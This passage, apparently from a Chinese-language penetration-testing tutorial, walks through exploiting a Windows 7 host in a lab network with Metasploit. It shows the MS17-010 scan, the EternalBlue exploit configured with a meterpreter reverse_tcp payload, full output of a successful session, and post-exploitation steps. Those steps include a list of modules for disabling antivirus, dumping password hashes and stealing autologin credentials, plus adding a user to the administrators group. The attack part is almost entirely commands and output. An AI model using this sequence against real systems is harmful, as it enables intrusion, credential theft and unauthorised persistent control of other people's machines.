-<h3 id="（4）使用辅助扫描模块测试"><a href="#（4）使用辅助扫描模块测试" class="headerlink" title="（4）使用辅助扫描模块测试"></a>（4）使用辅助扫描模块测试</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用辅助扫描模式进行探测</span></span><br><span class="line">msf6 auxiliary(scanner/portscan/syn) &gt; use auxiliary/scanner/smb/smb_ms17_010 </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示参数信息</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                    Required  Description</span><br><span class="line">   ----         ---------------                                    --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check</span><br><span class="line">                med_pipes.txt</span><br><span class="line">   RHOSTS                                                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span><br><span class="line">                                                                             it</span><br><span class="line">   RPORT        445                                                yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                  no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                         no        The password for the specified username</span><br><span class="line">   SMBUser                                                         no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                  yes       The number of concurrent threads (max one per host)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机IP</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.80.1</span><br><span class="line">RHOSTS =&gt; 192.168.80.1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认参数信息</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/smb/smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                    Required  Description</span><br><span class="line">   ----         ---------------                                    --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check</span><br><span class="line">                med_pipes.txt</span><br><span class="line">   RHOSTS       192.168.80.1                                       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasplo</span><br><span class="line">                                                                             it</span><br><span class="line">   RPORT        445                                                yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                  no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                         no        The password for the specified username</span><br><span class="line">   SMBUser                                                         no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                  yes       The number of concurrent threads (max one per host)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行探测（目标主机 windows11 ）</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[-] 192.168.80.1:445      - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] 192.168.80.1:445      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行探测（目标主机 windows7）</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.80.130:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.80.130:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>
-
-<h3 id="（5）实施攻击"><a href="#（5）实施攻击" class="headerlink" title="（5）实施攻击"></a>（5）实施攻击</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选择攻击模块</span></span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalblue </span><br><span class="line">[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置 payload 连接方式</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可使用 show payloads 查看适合要攻击的目标主机的payload</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出当前模块所需要配置的参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win</span><br><span class="line">                                             dows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi</span><br><span class="line">                                             ndows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.80.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置目标主机</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.80.130</span><br><span class="line">RHOSTS =&gt; 192.168.80.130</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">确认攻击参数</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         192.168.80.130   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2,</span><br><span class="line">                                              Windows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Win</span><br><span class="line">                                             dows 7, Windows Embedded Standard 7 target machines.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Wi</span><br><span class="line">                                             ndows Embedded Standard 7 target machines.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.80.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发起攻击</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击成功后攻击机和目标机之间会建立一个连接，得到一个meterpreter会话</span></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.80.128:4444 </span><br><span class="line">[*] 192.168.80.130:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 192.168.80.130:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)</span><br><span class="line">[*] 192.168.80.130:445    - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[+] 192.168.80.130:445 - The target is vulnerable.</span><br><span class="line">[*] 192.168.80.130:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.80.130:445 - CORE raw buffer dump (23 bytes)</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         </span><br><span class="line">[+] 192.168.80.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.80.130:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.80.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.80.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.80.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.80.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.80.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.80.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.80.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.80.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.80.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.80.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[-] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[*] 192.168.80.130:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.80.130:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.80.130:445 - CORE raw buffer dump (23 bytes)</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima</span><br><span class="line">[*] 192.168.80.130:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         </span><br><span class="line">[+] 192.168.80.130:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 192.168.80.130:445 - Trying exploit with 17 Groom Allocations.</span><br><span class="line">[*] 192.168.80.130:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.80.130:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.80.130:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.80.130:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.80.130:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.80.130:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.80.130:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.80.130:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">永恒之蓝覆盖成功！</span></span><br><span class="line">[*] 192.168.80.130:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.80.130:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200774 bytes) to 192.168.80.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.80.128:4444 -&gt; 192.168.80.130:49159) at 2022-11-28 00:07:45 +0800</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">攻击机与目标主机建立了一个shell会话。</span></span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 192.168.80.130:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></pre></td></tr></table></figure>
-
-<h3 id="（6）后渗透攻击"><a href="#（6）后渗透攻击" class="headerlink" title="（6）后渗透攻击"></a>（6）后渗透攻击</h3><p>该模块主要用于对目标机进行进一步渗透，以下是post模块中常用命令：</p>
-<ul>
-<li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm  # 查看目标主机是否允许在虚拟机上</li>
-<li>run post&#x2F;windows&#x2F;manage&#x2F;migrate  # 自动进程迁移</li>
-<li>run post&#x2F;windows&#x2F;manage&#x2F;killav      # 关闭杀毒软件</li>
-<li>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp   # 开启远程桌面服务</li>
-<li>run post&#x2F;windows&#x2F;manage&#x2F;autoroute      # 查看路由信息</li>
-<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users   # 列举当前登录的用户</li>
-<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications            # 列举应用程序</li>
-<li>run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin  # 抓取自动登录的用户名和密码</li>
-<li>run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump   # dump 出所有用户的 hash</li>
-</ul>
-<h4 id="6-1-获取-shell-，设置编码，查看-ip-信息"><a href="#6-1-获取-shell-，设置编码，查看-ip-信息" class="headerlink" title="6.1 获取 shell ，设置编码，查看 ip 信息"></a>6.1 获取 shell ，设置编码，查看 ip 信息</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">尝试获取 shell</span></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 232 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解决乱码问题（部分乱码可解决）</span></span><br><span class="line">C:\Windows\system32&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看ip信息</span></span><br><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Bluetooth ��������:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::d927:d59a:fcdc:3a83%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.80.130</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.80.2</span><br></pre></td></tr></table></figure>
-
-<h4 id="6-2-创建用户，赋予最高权限"><a href="#6-2-创建用户，赋予最高权限" class="headerlink" title="6.2 创建用户，赋予最高权限"></a>6.2 创建用户，赋予最高权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前所有用户</span></span><br><span class="line">C:\Users\root\Documents&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts for \\</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">admin                    Administrator            ghost                    </span><br><span class="line">Guest                    root                     ying                     </span><br><span class="line">The command completed with one or more errors.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 admin 用户</span></span><br><span class="line">C:\Users\root\Documents&gt;net user admin</span><br><span class="line">net user admin</span><br><span class="line">User name                    admin</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/28 1:11:57</span><br><span class="line">Password expires             2023/1/9 1:11:57</span><br><span class="line">Password changeable          2022/11/28 1:11:57</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 root 用户信息</span></span><br><span class="line">C:\Users\root\Documents&gt;net user root</span><br><span class="line">net user root</span><br><span class="line">User name                    root</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/27 23:31:04</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2022/11/27 23:31:04</span><br><span class="line">Password required            No</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   2022/11/28 1:08:41</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加 admin 用户至 administrators 用户组，获取最高权限</span></span><br><span class="line">C:\Users\root\Documents&gt;net localgroup administrators admin /add </span><br><span class="line">net localgroup administrators admin /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看 admin 用户信息</span></span><br><span class="line">C:\Users\root\Documents&gt;net user admin </span><br><span class="line">net user admin </span><br><span class="line">User name                    admin</span><br><span class="line">Full Name                    </span><br><span class="line">Comment                      </span><br><span class="line">User&#x27;s comment               </span><br><span class="line">Country code                 000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2022/11/28 1:11:57</span><br><span class="line">Password expires             2023/1/9 1:11:57</span><br><span class="line">Password changeable          2022/11/28 1:11:57</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script                 </span><br><span class="line">User profile                 </span><br><span class="line">Home directory               </span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships      *Administrators       *Users                </span><br><span class="line">Global Group memberships     *None                 </span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
-
